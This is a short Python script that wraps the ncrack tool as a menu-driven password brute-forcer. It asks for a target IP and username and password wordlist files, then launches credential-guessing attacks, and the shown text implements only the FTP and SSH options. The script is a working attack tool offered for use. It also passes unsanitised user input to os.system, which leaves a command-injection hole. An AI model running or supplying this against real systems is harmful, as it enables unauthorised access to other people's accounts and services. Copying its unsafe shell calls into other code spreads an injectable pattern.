#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Brute Force")

print("""
1) FTP
2) SSH
3) Telnet
4) HTTP
5) SMB
6) RDP
7) VNC
8) SIP
9) Redis
10) PostgreSQL
11) MySQL
""")

proccesno = raw_input("Procces No: ")
targetip = raw_input("Target IP: ")
username = raw_input("File Path with Username: ")
passwd = raw_input("File Path with Passwords: ")

if (proccesno == "1"):
	os.system("ncrack -p 21 -U " + username + " -P " + passwd + " " + targetip)

if (proccesno == "2"):
	os.system("ncrack -p 22 -U " + username + " -P " + passwd + " " + targetip)